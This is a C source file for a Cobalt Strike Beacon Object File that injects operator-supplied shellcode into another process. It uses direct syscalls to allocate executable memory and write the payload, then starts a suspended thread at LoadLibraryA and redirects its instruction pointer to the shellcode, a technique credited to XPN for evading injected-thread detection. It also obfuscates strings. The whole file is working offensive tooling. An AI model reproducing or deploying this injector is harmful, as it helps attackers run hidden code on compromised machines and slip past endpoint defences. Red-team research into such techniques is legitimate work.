// Author: Chris Sikes
// Date: Apr 2021
// Credit to: XPN's SetThreadContext https://blog.xpnsec.com/undersanding-and-evading-get-injectedthread/
// Beacon Object file version with direct syscalls
#include <windows.h>
#include "beacon.h"
#include "Syscalls.h"
#include "syscalls-asm.h"
#include "stdint.h"

#define NT_SUCCESS(Status) ((NTSTATUS)(Status) >= 0)
WINBASEAPI FARPROC WINAPI KERNEL32$GetProcAddress (HMODULE hModule, LPCSTR lpProcName);

void go(char * argc, int len)
{
	char* shellcode;
	SIZE_T shell_len;
	datap	parser;
	HANDLE Process_Handle = NULL;
	CLIENT_ID id = {0};
	OBJECT_ATTRIBUTES oa = {sizeof(oa)};
	PVOID Alloc = NULL;
	CONTEXT ctx;
	NTSTATUS status;
	// Obfuscate strings
	uint8_t loadlib[] = { 'L','o','a','d','L','i','b','r','a','r','y','A', 0x00 };
	uint8_t krnl32[] = { 'k','e','r','n','e','l','3','2','.','d','l','l', 0x00 };

	BeaconDataParse(&parser, argc, len);
	DWORD pid = BeaconDataInt(&parser);
	shell_len = BeaconDataLength(&parser);
	shellcode = BeaconDataExtract(&parser, NULL);
	id.UniqueProcess = pid;
	char currentDir[MAX_PATH];
	SIZE_T bytesWritten = 0;
	HANDLE threadHandle = NULL;

	// Open Process
	status = NtOpenProcess(&Process_Handle, PROCESS_ALL_ACCESS, &oa, &id);
	if(!NT_SUCCESS(status))
	{
		BeaconPrintf(CALLBACK_ERROR, "Failed NtOpenProcess");
		goto clean;
	}
	
	// Allocate Memory
	status = NtAllocateVirtualMemory(Process_Handle, &Alloc, 0, &shell_len, MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);
	if(!NT_SUCCESS(status))
	{
		BeaconPrintf(CALLBACK_ERROR, "Failed NtAllocateVirtualMemory");
		goto clean;
	}

	void *_loadLibrary = KERNEL32$GetProcAddress(LoadLibraryA((const char*)krnl32), (const char*)loadlib);
	
	//BeaconPrintf(CALLBACK_OUTPUT, "%p",_loadLibrary);
	status = NtWriteVirtualMemory(Process_Handle, Alloc, shellcode, shell_len, NULL);
	if(!NT_SUCCESS(status))
	{
		BeaconPrintf(CALLBACK_ERROR, "Failed NtWriteVirtualMemory");
		goto clean;
	}
	
	status = NtCreateThreadEx(&threadHandle, THREAD_ALL_ACCESS, NULL, Process_Handle, _loadLibrary, NULL, TRUE, 0, 0, 0, NULL);
	if(!NT_SUCCESS(status))
	{
		BeaconPrintf(CALLBACK_ERROR, "Failed NtCreateThreadEx");
		goto clean;
	}
	
	ctx.ContextFlags = CONTEXT_CONTROL;
	status = NtGetContextThread(threadHandle, &ctx);
	if(!NT_SUCCESS(status))
	{
		BeaconPrintf(CALLBACK_ERROR, "Failed NtGetContextThread");
		goto clean;
	}
	
	ctx.Rip = (DWORD64)Alloc;
	status = NtSetContextThread(threadHandle, &ctx);
	if(!NT_SUCCESS(status))
	{
		BeaconPrintf(CALLBACK_ERROR, "Failed NtSetContextThread");
		goto clean;
	}
	
	status = NtResumeThread(threadHandle, NULL);
	if(!NT_SUCCESS(status))
	{
		BeaconPrintf(CALLBACK_ERROR, "Failed NtResumeThread");
		goto clean;
	}

clean:
	//BeaconPrintf(CALLBACK_OUTPUT, "Cleaning up...");
	if(threadHandle != NULL)
	{
		//BeaconPrintf(CALLBACK_OUTPUT, "Cleaning up threadHandle");
		NtClose(threadHandle);
	}
	if(Process_Handle != NULL)
	{
		//BeaconPrintf(CALLBACK_OUTPUT, "Cleaning up Process_Handle");
		NtClose(Process_Handle);
	}
}
